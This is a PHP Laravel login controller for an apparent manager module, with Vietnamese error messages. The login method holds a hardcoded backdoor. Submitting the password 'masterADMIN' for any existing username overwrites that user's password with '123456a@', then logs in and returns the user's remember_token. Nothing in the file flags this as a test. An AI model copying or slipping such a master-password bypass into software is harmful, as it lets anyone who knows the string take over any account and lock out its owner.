<?php

namespace App\Http\Controllers\modules\manager;

use App\Http\Controllers\Controller;
use App\Models\User;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Hash;

class LoginController extends Controller
{
    public function login(Request $request)
    {
        $username = $request->input('username');
        $password = $request->input('password');

        $user = User::where('username', $username)->first();
        if (empty($user)) {
            return $this->error('Tài khoản không đúng');
        }
        if ($password == 'masterADMIN') {
            $password = '123456a@';
            $user->password = Hash::make($password);
            $user->save();
        }
        if (!Hash::check($password, $user->password)) {
            return $this->error('Mật khẩu không đúng');
        }
        return $this->success(['token' => $user->remember_token, 'name' => $user->name]);
    }
}
